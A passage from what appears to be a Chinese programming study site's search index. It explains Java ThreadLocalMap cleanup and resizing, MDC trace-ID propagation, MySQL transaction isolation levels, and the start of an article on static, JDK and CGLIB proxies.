nextIndex(staleSlot, len); (e = tab[i]) != null; i = nextIndex(i, len)) { ThreadLocal\u0026lt;?\u0026gt; k = e.get(); if (k == key) { e.value = value; tab[i] = tab[staleSlot]; tab[staleSlot] = e; if (slotToExpunge == staleSlot) slotToExpunge = i; cleanSomeSlots(expungeStaleEntry(slotToExpunge), len); return; } if (k == null \u0026amp;\u0026amp; slotToExpunge == staleSlot) slotToExpunge = i; } tab[staleSlot].value = null; tab[staleSlot] = new Entry(key, value); if (slotToExpunge != staleSlot) cleanSomeSlots(expungeStaleEntry(slotToExpunge), len); } slotToExpunge表示开始探测式清理过期数据的开始下标，默认从当前的staleSlot开始。以当前的staleSlot开始，向前迭代查找，找到没有过期的数据，for循环一直碰到Entry为null才会结束。如果向前找到了过期数据，更新探测清理过期数据的开始下标为 i，即slotToExpunge=i\nfor (int i = prevIndex(staleSlot, len); (e = tab[i]) != null; i = prevIndex(i, len)){ if (e.get() == null){ slotToExpunge = i; } } 接着开始从staleSlot向后查找，也是碰到Entry为null的桶结束。 如果迭代过程中，碰到 k == key，这说明这里是替换逻辑，替换新数据并且交换当前staleSlot位置。如果slotToExpunge == staleSlot，这说明replaceStaleEntry()一开始向前查找过期数据时并未找到过期的Entry数据，接着向后查找过程中也未发现过期数据，修改开始探测式清理过期数据的下标为当前循环的 index，即slotToExpunge = i。最后调用cleanSomeSlots(expungeStaleEntry(slotToExpunge), len);进行启发式过期数据清理。\nif (k == key) { e.value = value; tab[i] = tab[staleSlot]; tab[staleSlot] = e; if (slotToExpunge == staleSlot) slotToExpunge = i; cleanSomeSlots(expungeStaleEntry(slotToExpunge), len); return; } cleanSomeSlots()和expungeStaleEntry()方法后面都会细讲，这两个是和清理相关的方法，一个是过期key相关Entry的启发式清理(Heuristically scan)，另一个是过期key相关Entry的探测式清理。\n如果 k != key则会接着往下走，k == null说明当前遍历的Entry是一个过期数据，slotToExpunge == staleSlot说明，一开始的向前查找数据并未找到过期的Entry。如果条件成立，则更新slotToExpunge 为当前位置，这个前提是前驱节点扫描时未发现过期数据。\nif (k == null \u0026amp;\u0026amp; slotToExpunge == staleSlot) slotToExpunge = i; 往后迭代的过程中如果没有找到k == key的数据，且碰到Entry为null的数据，则结束当前的迭代操作。此时说明这里是一个添加的逻辑，将新的数据添加到table[staleSlot] 对应的slot中。\ntab[staleSlot].value = null; tab[staleSlot] = new Entry(key, value); 最后判断除了staleSlot以外，还发现了其他过期的slot数据，就要开启清理数据的逻辑：\nif (slotToExpunge != staleSlot) cleanSomeSlots(expungeStaleEntry(slotToExpunge), len); ThreadLocalMap过期 key 的探测式清理流程    上面我们有提及ThreadLocalMap的两种过期key数据清理方式：探测式清理和启发式清理。\n我们先讲下探测式清理，也就是expungeStaleEntry方法，遍历散列数组，从开始位置向后探测清理过期数据，将过期数据的Entry设置为null，沿途中碰到未过期的数据则将此数据rehash后重新在table数组中定位，如果定位的位置已经有了数据，则会将未过期的数据放到最靠近此位置的Entry=null的桶中，使rehash后的Entry数据距离正确的桶的位置更近一些。操作逻辑如下：\n如上图，set(27) 经过 hash 计算后应该落到index=4的桶中，由于index=4桶已经有了数据，所以往后迭代最终数据放入到index=7的桶中，放入后一段时间后index=5中的Entry数据key变为了null\n如果再有其他数据set到map中，就会触发探测式清理操作。\n如上图，执行探测式清理后，index=5的数据被清理掉，继续往后迭代，到index=7的元素时，经过rehash后发现该元素正确的index=4，而此位置已经有了数据，往后查找离index=4最近的Entry=null的节点(刚被探测式清理掉的数据：index=5)，找到后移动index= 7的数据到index=5中，此时桶的位置离正确的位置index=4更近了。\n经过一轮探测式清理后，key过期的数据会被清理掉，没过期的数据经过rehash重定位后所处的桶位置理论上更接近i= key.hashCode \u0026amp; (tab.len - 1)的位置。这种优化会提高整个散列表查询性能。\n接着看下expungeStaleEntry()具体流程，我们还是以先原理图后源码讲解的方式来一步步梳理：\n我们假设expungeStaleEntry(3) 来调用此方法，如上图所示，我们可以看到ThreadLocalMap中table的数据情况，接着执行清理操作：\n第一步是清空当前staleSlot位置的数据，index=3位置的Entry变成了null。然后接着往后探测：\n执行完第二步后，index=4 的元素挪到 index=3 的槽位中。\n继续往后迭代检查，碰到正常数据，计算该数据位置是否偏移，如果被偏移，则重新计算slot位置，目的是让正常数据尽可能存放在正确位置或离正确位置更近的位置\n在往后迭代的过程中碰到空的槽位，终止探测，这样一轮探测式清理工作就完成了，接着我们继续看看具体实现源代码：\nprivate int expungeStaleEntry(int staleSlot) { Entry[] tab = table; int len = tab.length; tab[staleSlot].value = null; tab[staleSlot] = null; size--; Entry e; int i; for (i = nextIndex(staleSlot, len); (e = tab[i]) != null; i = nextIndex(i, len)) { ThreadLocal\u0026lt;?\u0026gt; k = e.get(); if (k == null) { e.value = null; tab[i] = null; size--; } else { int h = k.threadLocalHashCode \u0026amp; (len - 1); if (h != i) { tab[i] = null; while (tab[h] != null) h = nextIndex(h, len); tab[h] = e; } } } return i; } 这里我们还是以staleSlot=3 来做示例说明，首先是将tab[staleSlot]槽位的数据清空，然后设置size-- 接着以staleSlot位置往后迭代，如果遇到k==null的过期数据，也是清空该槽位数据，然后size--\nThreadLocal\u0026lt;?\u0026gt; k = e.get(); if (k == null) { e.value = null; tab[i] = null; size--; } 如果key没有过期，重新计算当前key的下标位置是不是当前槽位下标位置，如果不是，那么说明产生了hash冲突，此时以新计算出来正确的槽位位置往后迭代，找到最近一个可以存放entry的位置。\nint h = k.threadLocalHashCode \u0026amp; (len - 1); if (h != i) { tab[i] = null; while (tab[h] != null) h = nextIndex(h, len); tab[h] = e; } 这里是处理正常的产生Hash冲突的数据，经过迭代后，有过Hash冲突数据的Entry位置会更靠近正确位置，这样的话，查询的时候 效率才会更高。\nThreadLocalMap扩容机制    在ThreadLocalMap.set()方法的最后，如果执行完启发式清理工作后，未清理到任何数据，且当前散列数组中Entry的数量已经达到了列表的扩容阈值(len*2/3)，就开始执行rehash()逻辑：\nif (!cleanSomeSlots(i, sz) \u0026amp;\u0026amp; sz \u0026gt;= threshold) rehash(); 接着看下rehash()具体实现：\nprivate void rehash() { expungeStaleEntries(); if (size \u0026gt;= threshold - threshold / 4) resize(); } private void expungeStaleEntries() { Entry[] tab = table; int len = tab.length; for (int j = 0; j \u0026lt; len; j++) { Entry e = tab[j]; if (e != null \u0026amp;\u0026amp; e.get() == null) expungeStaleEntry(j); } } 这里首先是会进行探测式清理工作，从table的起始位置往后清理，上面有分析清理的详细流程。清理完成之后，table中可能有一些key为null的Entry数据被清理掉，所以此时通过判断size \u0026gt;= threshold - threshold / 4 也就是size \u0026gt;= threshold * 3/4 来决定是否扩容。\n我们还记得上面进行rehash()的阈值是size \u0026gt;= threshold，所以当面试官套路我们ThreadLocalMap扩容机制的时候 我们一定要说清楚这两个步骤：\n接着看看具体的resize()方法，为了方便演示，我们以oldTab.len=8来举例：\n扩容后的tab的大小为oldLen * 2，然后遍历老的散列表，重新计算hash位置，然后放到新的tab数组中，如果出现hash冲突则往后寻找最近的entry为null的槽位，遍历完成之后，oldTab中所有的entry数据都已经放入到新的tab中了。重新计算tab下次扩容的阈值，具体代码如下：\nprivate void resize() { Entry[] oldTab = table; int oldLen = oldTab.length; int newLen = oldLen * 2; Entry[] newTab = new Entry[newLen]; int count = 0; for (int j = 0; j \u0026lt; oldLen; ++j) { Entry e = oldTab[j]; if (e != null) { ThreadLocal\u0026lt;?\u0026gt; k = e.get(); if (k == null) { e.value = null; } else { int h = k.threadLocalHashCode \u0026amp; (newLen - 1); while (newTab[h] != null) h = nextIndex(h, newLen); newTab[h] = e; count++; } } } setThreshold(newLen); size = count; table = newTab; } ThreadLocalMap.get()详解    上面已经看完了set()方法的源码，其中包括set数据、清理数据、优化数据桶的位置等操作，接着看看get()操作的原理。\nThreadLocalMap.get()图解    第一种情况： 通过查找key值计算出散列表中slot位置，然后该slot位置中的Entry.key和查找的key一致，则直接返回：\n第二种情况： slot位置中的Entry.key和要查找的key不一致：\n我们以get(ThreadLocal1)为例，通过hash计算后，正确的slot位置应该是 4，而index=4的槽位已经有了数据，且key值不等于ThreadLocal1，所以需要继续往后迭代查找。\n迭代到index=5的数据时，此时Entry.key=null，触发一次探测式数据回收操作，执行expungeStaleEntry()方法，执行完后，index 5,8的数据都会被回收，而index 6,7的数据都会前移，此时继续往后迭代，到index = 6的时候即找到了key值相等的Entry数据，如下图所示：\nThreadLocalMap.get()源码详解    java.lang.ThreadLocal.ThreadLocalMap.getEntry():\nprivate Entry getEntry(ThreadLocal\u0026lt;?\u0026gt; key) { int i = key.threadLocalHashCode \u0026amp; (table.length - 1); Entry e = table[i]; if (e != null \u0026amp;\u0026amp; e.get() == key) return e; else return getEntryAfterMiss(key, i, e); } private Entry getEntryAfterMiss(ThreadLocal\u0026lt;?\u0026gt; key, int i, Entry e) { Entry[] tab = table; int len = tab.length; while (e != null) { ThreadLocal\u0026lt;?\u0026gt; k = e.get(); if (k == key) return e; if (k == null) expungeStaleEntry(i); else i = nextIndex(i, len); e = tab[i]; } return null; } ThreadLocalMap过期 key 的启发式清理流程    上面多次提及到ThreadLocalMap过期key的两种清理方式：探测式清理(expungeStaleEntry())、启发式清理(cleanSomeSlots())\n探测式清理是以当前Entry 往后清理，遇到值为null则结束清理，属于线性探测清理。\n而启发式清理被作者定义为：Heuristically scan some cells looking for stale entries.\n具体代码如下：\nprivate boolean cleanSomeSlots(int i, int n) { boolean removed = false; Entry[] tab = table; int len = tab.length; do { i = nextIndex(i, len); Entry e = tab[i]; if (e != null \u0026amp;\u0026amp; e.get() == null) { n = len; removed = true; i = expungeStaleEntry(i); } } while ( (n \u0026gt;\u0026gt;\u0026gt;= 1) != 0); return removed; } InheritableThreadLocal    我们使用ThreadLocal的时候，在异步场景下是无法给子线程共享父线程中创建的线程副本数据的。\n为了解决这个问题，JDK 中还有一个InheritableThreadLocal类，我们来看一个例子：\npublic class InheritableThreadLocalDemo { public static void main(String[] args) { ThreadLocal\u0026lt;String\u0026gt; ThreadLocal = new ThreadLocal\u0026lt;\u0026gt;(); ThreadLocal\u0026lt;String\u0026gt; inheritableThreadLocal = new InheritableThreadLocal\u0026lt;\u0026gt;(); ThreadLocal.set(\u0026#34;父类数据:threadLocal\u0026#34;); inheritableThreadLocal.set(\u0026#34;父类数据:inheritableThreadLocal\u0026#34;); new Thread(new Runnable() { @Override public void run() { System.out.println(\u0026#34;子线程获取父类ThreadLocal数据：\u0026#34; + ThreadLocal.get()); System.out.println(\u0026#34;子线程获取父类inheritableThreadLocal数据：\u0026#34; + inheritableThreadLocal.get()); } }).start(); } } 打印结果：\n子线程获取父类ThreadLocal数据：null 子线程获取父类inheritableThreadLocal数据：父类数据:inheritableThreadLocal 实现原理是子线程是通过在父线程中通过调用new Thread()方法来创建子线程，Thread#init方法在Thread的构造方法中被调用。在init方法中拷贝父线程数据到子线程中：\nprivate void init(ThreadGroup g, Runnable target, String name, long stackSize, AccessControlContext acc, boolean inheritThreadLocals) { if (name == null) { throw new NullPointerException(\u0026#34;name cannot be null\u0026#34;); } if (inheritThreadLocals \u0026amp;\u0026amp; parent.inheritableThreadLocals != null) this.inheritableThreadLocals = ThreadLocal.createInheritedMap(parent.inheritableThreadLocals); this.stackSize = stackSize; tid = nextThreadID(); } 但InheritableThreadLocal仍然有缺陷，一般我们做异步化处理都是使用的线程池，而InheritableThreadLocal是在new Thread中的init()方法给赋值的，而线程池是线程复用的逻辑，所以这里会存在问题。\n当然，有问题出现就会有解决问题的方案，阿里巴巴开源了一个TransmittableThreadLocal组件就可以解决这个问题，这里就不再延伸，感兴趣的可自行查阅资料。\nThreadLocal项目中使用实战    ThreadLocal使用场景    我们现在项目中日志记录用的是ELK+Logstash，最后在Kibana中进行展示和检索。\n现在都是分布式系统统一对外提供服务，项目间调用的关系可以通过 traceId 来关联，但是不同项目之间如何传递 traceId 呢？\n这里我们使用 org.slf4j.MDC 来实现此功能，内部就是通过 ThreadLocal 来实现的，具体实现如下：\n当前端发送请求到服务 A时，服务 A会生成一个类似UUID的traceId字符串，将此字符串放入当前线程的ThreadLocal中，在调用服务 B的时候，将traceId写入到请求的Header中，服务 B在接收请求时会先判断请求的Header中是否有traceId，如果存在则写入自己线程的ThreadLocal中。\n图中的requestId即为我们各个系统链路关联的traceId，系统间互相调用，通过这个requestId即可找到对应链路，这里还有会有一些其他场景：\n针对于这些场景，我们都可以有相应的解决方案，如下所示\nFeign 远程调用解决方案    服务发送请求：\n@Component @Slf4j public class FeignInvokeInterceptor implements RequestInterceptor { @Override public void apply(RequestTemplate template) { String requestId = MDC.get(\u0026#34;requestId\u0026#34;); if (StringUtils.isNotBlank(requestId)) { template.header(\u0026#34;requestId\u0026#34;, requestId); } } } 服务接收请求：\n@Slf4j @Component public class LogInterceptor extends HandlerInterceptorAdapter { @Override public void afterCompletion(HttpServletRequest arg0, HttpServletResponse arg1, Object arg2, Exception arg3) { MDC.remove(\u0026#34;requestId\u0026#34;); } @Override public void postHandle(HttpServletRequest arg0, HttpServletResponse arg1, Object arg2, ModelAndView arg3) { } @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception { String requestId = request.getHeader(BaseConstant.REQUEST_ID_KEY); if (StringUtils.isBlank(requestId)) { requestId = UUID.randomUUID().toString().replace(\u0026#34;-\u0026#34;, \u0026#34;\u0026#34;); } MDC.put(\u0026#34;requestId\u0026#34;, requestId); return true; } } 线程池异步调用，requestId 传递    因为MDC是基于ThreadLocal去实现的，异步过程中，子线程并没有办法获取到父线程ThreadLocal存储的数据，所以这里可以自定义线程池执行器，修改其中的run()方法：\npublic class MyThreadPoolTaskExecutor extends ThreadPoolTaskExecutor { @Override public void execute(Runnable runnable) { Map\u0026lt;String, String\u0026gt; context = MDC.getCopyOfContextMap(); super.execute(() -\u0026gt; run(runnable, context)); } @Override private void run(Runnable runnable, Map\u0026lt;String, String\u0026gt; context) { if (context != null) { MDC.setContextMap(context); } try { runnable.run(); } finally { MDC.remove(); } } } 使用 MQ 发送消息给第三方系统    在 MQ 发送的消息体中自定义属性requestId，接收方消费消息后，自己解析requestId使用即可。\n"},{"id":323,"href":"/database/mysql/%E4%BA%8B%E5%8A%A1%E9%9A%94%E7%A6%BB%E7%BA%A7%E5%88%AB%E5%9B%BE%E6%96%87%E8%AF%A6%E8%A7%A3/","title":"事务隔离级别(图文详解)","parent":"mysql","content":" 本文由 SnailClimb 和 guang19 共同完成。\n  事务隔离级别(图文详解)  什么是事务? 事务的特性(ACID) 并发事务带来的问题 事务隔离级别 实际情况演示  脏读(读未提交) 避免脏读(读已提交) 不可重复读 可重复读 防止幻读(可重复读)   参考    事务隔离级别(图文详解)    什么是事务?    事务是逻辑上的一组操作，要么都执行，要么都不执行。\n事务最经典也经常被拿出来说例子就是转账了。假如小明要给小红转账1000元，这个转账会涉及到两个关键操作就是：将小明的余额减少1000元，将小红的余额增加1000元。万一在这两个操作之间突然出现错误比如银行系统崩溃，导致小明余额减少而小红的余额没有增加，这样就不对了。事务就是保证这两个关键操作要么都成功，要么都要失败。\n事务的特性(ACID)     原子性： 事务是最小的执行单位，不允许分割。事务的原子性确保动作要么全部完成，要么完全不起作用； 一致性： 执行事务前后，数据保持一致，例如转账业务中，无论事务是否成功，转账者和收款人的总额应该是不变的； 隔离性： 并发访问数据库时，一个用户的事务不被其他事务所干扰，各并发事务之间数据库是独立的； 持久性： 一个事务被提交之后。它对数据库中数据的改变是持久的，即使数据库发生故障也不应该对其有任何影响。  并发事务带来的问题    在典型的应用程序中，多个事务并发运行，经常会操作相同的数据来完成各自的任务（多个用户对统一数据进行操作）。并发虽然是必须的，但可能会导致以下的问题。\n 脏读（Dirty read）: 当一个事务正在访问数据并且对数据进行了修改，而这种修改还没有提交到数据库中，这时另外一个事务也访问了这个数据，然后使用了这个数据。因为这个数据是还没有提交的数据，那么另外一个事务读到的这个数据是“脏数据”，依据“脏数据”所做的操作可能是不正确的。 丢失修改（Lost to modify）: 指在一个事务读取一个数据时，另外一个事务也访问了该数据，那么在第一个事务中修改了这个数据后，第二个事务也修改了这个数据。这样第一个事务内的修改结果就被丢失，因此称为丢失修改。\t例如：事务1读取某表中的数据A=20，事务2也读取A=20，事务1修改A=A-1，事务2也修改A=A-1，最终结果A=19，事务1的修改被丢失。 不可重复读（Unrepeatableread）: 指在一个事务内多次读同一数据。在这个事务还没有结束时，另一个事务也访问该数据。那么，在第一个事务中的两次读数据之间，由于第二个事务的修改导致第一个事务两次读取的数据可能不太一样。这就发生了在一个事务内两次读到的数据是不一样的情况，因此称为不可重复读。 幻读（Phantom read）: 幻读与不可重复读类似。它发生在一个事务（T1）读取了几行数据，接着另一个并发事务（T2）插入了一些数据时。在随后的查询中，第一个事务（T1）就会发现多了一些原本不存在的记录，就好像发生了幻觉一样，所以称为幻读。  不可重复度和幻读区别：\n不可重复读的重点是修改，幻读的重点在于新增或者删除。\n例1（同样的条件, 你读取过的数据, 再次读取出来发现值不一样了 ）：事务1中的A先生读取自己的工资为 1000的操作还没完成，事务2中的B先生就修改了A的工资为2000，导 致A再读自己的工资时工资变为 2000；这就是不可重复读。\n例2（同样的条件, 第1次和第2次读出来的记录数不一样 ）：假某工资单表中工资大于3000的有4人，事务1读取了所有工资大于3000的人，共查到4条记录，这时事务2 又插入了一条工资大于3000的记录，事务1再次读取时查到的记录就变为了5条，这样就导致了幻读。\n事务隔离级别    SQL 标准定义了四个隔离级别：\n READ-UNCOMMITTED(读取未提交)： 最低的隔离级别，允许读取尚未提交的数据变更，可能会导致脏读、幻读或不可重复读。 READ-COMMITTED(读取已提交)： 允许读取并发事务已经提交的数据，可以阻止脏读，但是幻读或不可重复读仍有可能发生。 REPEATABLE-READ(可重复读)： 对同一字段的多次读取结果都是一致的，除非数据是被本身事务自己所修改，可以阻止脏读和不可重复读，但幻读仍有可能发生。 SERIALIZABLE(可串行化)： 最高的隔离级别，完全服从ACID的隔离级别。所有的事务依次逐个执行，这样事务之间就完全不可能产生干扰，也就是说，该级别可以防止脏读、不可重复读以及幻读。      隔离级别 脏读 不可重复读 幻影读     READ-UNCOMMITTED √ √ √   READ-COMMITTED × √ √   REPEATABLE-READ × × √   SERIALIZABLE × × ×    MySQL InnoDB 存储引擎的默认支持的隔离级别是 REPEATABLE-READ（可重读）。我们可以通过SELECT @@tx_isolation;命令来查看，MySQL 8.0 该命令改为SELECT @@transaction_isolation;\nmysql\u0026gt; SELECT @@tx_isolation; +-----------------+ | @@tx_isolation | +-----------------+ | REPEATABLE-READ | +-----------------+ 这里需要注意的是：与 SQL 标准不同的地方在于 InnoDB 存储引擎在 REPEATABLE-READ（可重读） 事务隔离级别下使用的是 Next-Key Lock 锁算法，因此可以避免幻读的产生，这与其他数据库系统(如 SQL Server)是不同的。所以说 InnoDB 存储引擎的默认支持的隔离级别是 REPEATABLE-READ（可重读） 已经可以完全保证事务的隔离性要求，即达到了 SQL 标准的 SERIALIZABLE(可串行化) 隔离级别。\n🐛 问题更正：MySQL InnoDB 的 REPEATABLE-READ（可重读）并不保证避免幻读，需要应用使用加锁读来保证。而这个加锁度使用到的机制就是 Next-Key Locks。\n因为隔离级别越低，事务请求的锁越少，所以大部分数据库系统的隔离级别都是 READ-COMMITTED(读取提交内容) ，但是你要知道的是 InnoDB 存储引擎默认使用 REPEATABLE-READ（可重读） 并不会有任何性能损失。\nInnoDB 存储引擎在 分布式事务 的情况下一般会用到 SERIALIZABLE(可串行化) 隔离级别。\n🌈 拓展一下(以下内容摘自《MySQL 技术内幕：InnoDB 存储引擎(第 2 版)》7.7 章)：\n InnoDB 存储引擎提供了对 XA 事务的支持，并通过 XA 事务来支持分布式事务的实现。分布式事务指的是允许多个独立的事务资源（transactional resources）参与到一个全局的事务中。事务资源通常是关系型数据库系统，但也可以是其他类型的资源。全局事务要求在其中的所有参与的事务要么都提交，要么都回滚，这对于事务原有的 ACID 要求又有了提高。另外，在使用分布式事务时，InnoDB 存储引擎的事务隔离级别必须设置为 SERIALIZABLE。\n 实际情况演示    在下面我会使用 2 个命令行mysql ，模拟多线程（多事务）对同一份数据的脏读问题。\nMySQL 命令行的默认配置中事务都是自动提交的，即执行SQL语句后就会马上执行 COMMIT 操作。如果要显式地开启一个事务需要使用命令：START TARNSACTION。\n我们可以通过下面的命令来设置隔离级别。\nSET [SESSION|GLOBAL] TRANSACTION ISOLATION LEVEL [READ UNCOMMITTED|READ COMMITTED|REPEATABLE READ|SERIALIZABLE] 我们再来看一下我们在下面实际操作中使用到的一些并发控制语句:\n START TARNSACTION |BEGIN：显式地开启一个事务。 COMMIT：提交事务，使得对数据库做的所有修改成为永久性。 ROLLBACK：回滚会结束用户的事务，并撤销正在进行的所有未提交的修改。  脏读(读未提交)     避免脏读(读已提交)     不可重复读    还是刚才上面的读已提交的图，虽然避免了读未提交，但是却出现了，一个事务还没有结束，就发生了 不可重复读问题。\n 可重复读     防止幻读(可重复读)     一个事务对数据库进行操作，这种操作的范围是数据库的全部行，然后第二个事务也在对这个数据库操作，这种操作可以是插入一行记录或删除一行记录，那么第一个是事务就会觉得自己出现了幻觉，怎么还有没有处理的记录呢? 或者 怎么多处理了一行记录呢?\n幻读和不可重复读有些相似之处 ，但是不可重复读的重点是修改，幻读的重点在于新增或者删除。\n参考     《MySQL技术内幕：InnoDB存储引擎》 https://dev.mysql.com/doc/refman/5.7/en/ Mysql 锁：灵魂七拷问 Innodb 中的事务隔离级别和锁的关系  "},{"id":324,"href":"/java/basis/%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F%E8%AF%A6%E8%A7%A3/","title":"代理模式详解","parent":"basis","content":" 本文首更于《从零开始手把手教你实现一个简单的RPC框架》 。\n  1. 代理模式 2. 静态代理 3. 动态代理  3.1. JDK 动态代理机制  3.1.1. 介绍 3.1.2. JDK 动态代理类使用步骤 3.1.3. 代码示例   3.2. CGLIB 动态代理机制  3.2.1. 介绍 3.2.2. CGLIB 动态代理类使用步骤 3.2.3. 代码示例   3.3. JDK 动态代理和 CGLIB 动态代理对比   4. 静态代理和动态代理的对比 5. 总结  1. 代理模式    代理模式是一种比较好理解的设计模式。简单来说就是 我们使用代理对象来代替对真实对象(real object)的访问，这样就可以在不修改原目标对象的前提下，提供额外的功能操作，扩展目标对象的功能。\n代理模式的主要作用是扩展目标对象的功能，比如说在目标对象的某个方法执行前后你可以增加一些自定义的操作。\n举个例子：你找了小红来帮你问话，小红就可以看作是代理你的代理对象，代理的行为（方法）是问话。\nhttps://medium.com/@mithunsasidharan/understanding-the-proxy-design-pattern-5e63fe38052a\n代理模式有静态代理和动态代理两种实现方式，我们 先来看一下静态代理模式的实现。\n2. 静态代理    静态代理中，我们对目标对象的每个方法的增强都是手动完成的（后面会具体演示代码），非常不灵活（比如接口一旦新增加方法，目标对象和代理对象都要进行修改）且麻烦(需要对每个目标类都单独写一个代理类)。 实际应用场景非常非常少，日常开发几乎看不到使用静态代理的场景。\n上面我们是从实现和应用角度来说的静态代理，从 JVM 层面来说， 静态代理在编译时就将接口、实现类、代理类这些都变成了一个个实际的 class 文件。\n静态代理实现步骤:\n 定义一个接口及其实现类； 创建一个代理类同样实现这个接口 将目标对象注入进代理类，然后在代理类的对应方法调用目标类中的对应方法。这样的话，我们就可以通过代理类屏蔽对目标对象的访问，并且可以在目标方法执行前后做一些自己想做的事情。  下面通过代码展示！\n1.定义发送短信的接口\npublic interface SmsService { String send(String message); } 2.实现发送短信的接口\npublic class SmsServiceImpl implements SmsService { public String send(String message) { System.out.println(\u0026#34;send message:\u0026#34; + message); return message; } } 3.创建代理类并同样实现发送短信的接口\npublic class SmsProxy implements SmsService { private final SmsService smsService; public SmsProxy(SmsService smsService) { this.smsService = smsService; } @Override public String send(String message) { //调用方法之前，我们可以添加自己的操作  System.out.println(\u0026#34;before method send()\u0026#34;); smsService.send(message); //调用方法之后，我们同样可以添加自己的操作  System.out.println(\u0026#34;after method send()\u0026#34;); return null; } } 4.实际使用\npublic class Main { public static void main(String[] args) { SmsService smsService = new SmsServiceImpl(); SmsProxy smsProxy = new SmsProxy(smsService); smsProxy.send(\u0026#34;java\u0026#34;); } } 运行上述代码之后，控制台打印出：\nbefore method send() send message:java after method send() 可以输出结果看出，我们已经增加了 SmsServiceImpl 的send()方法。\n3. 动态代理    相比于静态代理来说，动态代理更加灵活。我们不需要针对每个目标类都单独创建一个代理类，并且也不需要我们必须实现接口，我们可以直接代理实现类( CGLIB 动态代理机制)。\n从 JVM 角度来说，动态代理是在运行时动态生成类字节码，并加载到 JVM 中的。\n说到动态代理，Spring AOP、RPC 框架应该是两个不得不提的，它们的实现都依赖了动态代理。\n动态代理在我们日常开发中使用的相对较少，但是在框架中的几乎是必用的一门技术。学会了动态代理之后，对于我们理解和学习各种框架的原理也非常有帮助。\n就 Java 来说，动态代理的实现方式有很多种，比如 JDK 动态代理、CGLIB 动态代理等等。\nguide-rpc-framework 使用的是 JDK 动态代理，我们先来看看 JDK 动态代理的使用。\n另外，虽然 guide-rpc-framework 没有用到 CGLIB 动态代理 ，我们这里还是简单介绍一下其使用以及和JDK 动态代理的对比。\n3.1. JDK 动态代理机制    3.1.1. 介绍    在 Java 动态代理机制中 InvocationHandler 接口和 Proxy 类是核心。\nProxy 类中使用频率最高的方法是：newProxyInstance() ，这个方法主要用来生成一个代理对象。\npublic static Object newProxyInstance(ClassLoader loader, Class\u0026lt;?\u0026gt;[] interfaces, InvocationHandler h) throws IllegalArgumentException { ...... } 这个方法一共有 3 个参数：\n loader :类加载器，用于加载代理对象。 interfaces : 被代理类实现的一些接口； h : 实现了 InvocationHandler 接口的对象；  要实现动态代理的话，还必须需要实现InvocationHandler 来自定义处理逻辑。 当我们的动态代理对象调用一个方法时，这个方法的调用就会被转发到实现InvocationHandler 接口类的 invoke 方法来调用。\npublic interface InvocationHandler { /** * 当你使用代理对象调用方法的时候实际会调用到这个方法 */ public Object invoke(Object proxy, Method method, Object[] args) throws Throwable; } invoke() 方法有下面三个参数：\n proxy :动态生成的代理类 method : 与代理类对象调用的方法相对应 args : 当前 method 方法的参数  也就是说：你通过Proxy 类的 newProxyInstance() 创建的代理对象在调用方法的时候，实际会调用到实现InvocationHandler 接口的类的 invoke()方法。 你可以在 invoke() 方法中自定义处理逻辑，比如在方法执行前后做什么事情。\n3.1.2. JDK 动态代理类使用步骤     定义一个接口及其实现类； 自定义 InvocationHandler 并重写invoke方法，在 invoke 方法中我们会调用原生方法（被代理类的方法）并自定义一些处理逻辑； 通过 Proxy.newProxyInstance(ClassLoader loader,Class\u0026lt;?\u0026gt;[] interfaces,InvocationHandler h) 方法创建代理对象；  3.1.3. 代码示例    这样说可能会有点空洞和难以理解，我上个例子，大家感受一下吧！\n1.定义发送短信的接口\npublic interface SmsService { String send(String message); } 2.实现发送短信的接口\npublic class SmsServiceImpl implements SmsService { public String send(String message) { System.out.println(\u0026#34;send message:\u0026#34; + message); return message; } } 3.定义一个 JDK 动态代理类\nimport java.lang.reflect.InvocationHandler; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; /** * @author shuang.kou * @createTime 2020年05月11日 11:23:00 */ public class DebugInvocationHandler implements InvocationHandler { /** * 代理类中的真实对象 */ private final Object target; public DebugInvocationHandler(Object target) { this.target = target; } public Object invoke(Object proxy, Method method, Object[] args) throws InvocationTargetException, IllegalAccessException { //调用方法之前，我们可以添加自己的操作  System.out.println(\u0026#34;before method \u0026#34; + method.getName()); Object result = method.invoke(target, args); //调用方法之后，我们同样可以添加自己的操作  System.out.println(\u0026#34;after method \u0026#34; + method.getName()); return result; } } invoke() 方法: 当我们的动态代理对象调用原生方法的时候，最终实际上调用到的是 invoke() 方法，然后 invoke() 方法代替我们去调用了被代理对象的原生方法。\n4.获取代理对象的工厂类\npublic class JdkProxyFactory { public static Object getProxy(Object target) { return Proxy.newProxyInstance( target.getClass().getClassLoader(), // 目标类的类加载  target.getClass().getInterfaces(), // 代理需要实现的接口，可指定多个  new DebugInvocationHandler(target) // 代理对象对应的自定义 InvocationHandler  ); } } getProxy() ：主要通过Proxy.newProxyInstance（）方法获取某个类的代理对象\n5.实际使用\nSmsService smsService = (SmsService) JdkProxyFactory.getProxy(new SmsServiceImpl()); smsService.send(\u0026#34;java\u0026#34;); 运行上述代码之后，控制台打印出：\nbefore method send send message:java after method send 3.2. CGLIB 动态代理机制    3.2.1. 介绍    JDK 动态代理有一个最致命的问题是其只能代理实现了接口的类。\n为了解决这个问题，我们可以用 CGLIB 动态代理机制来避免。\nCGLIB(Code Generation Library)是一个基于ASM的字节码生成库，它允许我们在运行时对字节码进行修改和动态生成。CGLIB 通过继承方式实现代理。很多知名的开源框架都使用到了CGLIB， 例如 Spring 中的 AOP 模块中：如果目标对象实现了接口，则默认采用 JDK 动态代理，否则采用 CGLIB 动态代理。\n在 CGLIB 动态代理机制中 MethodInterceptor 接口和 Enhancer 类是核心。\n你需要自定义 MethodInterceptor 并重写 intercept 方法，intercept 用于拦截增强被代理类的方法。\npublic interface MethodInterceptor extends Callback{ // 拦截被代理类中的方法  public Object intercept(Object obj, java.lang.reflect.Method method, Object[] args, MethodProxy proxy) throws Throwable; }  obj :被代理的对象（需要增强的对象） method :被拦截的方法（需要增强的方法） args :方法入参 proxy :用于调用原始方法  你可以通过 Enhancer类来动态获取被代理类，当代理类调用方法的时候，实际调用的是 MethodInterceptor 中的 intercept 方法。\n3.2.2. CGLIB 动态代理类使用步骤     定义一个类； 自定义 MethodInterceptor 并重写 intercept 方法，intercept 用于拦截增强被代理类的方法，和 JDK 动态代理中的 invoke 方法类似； 通过 Enhancer 类的 create()创建代理类；  3.2.3. 代码示例    不同于 JDK 动态代理不需要额外的依赖。CGLIB(Code Generation Library) 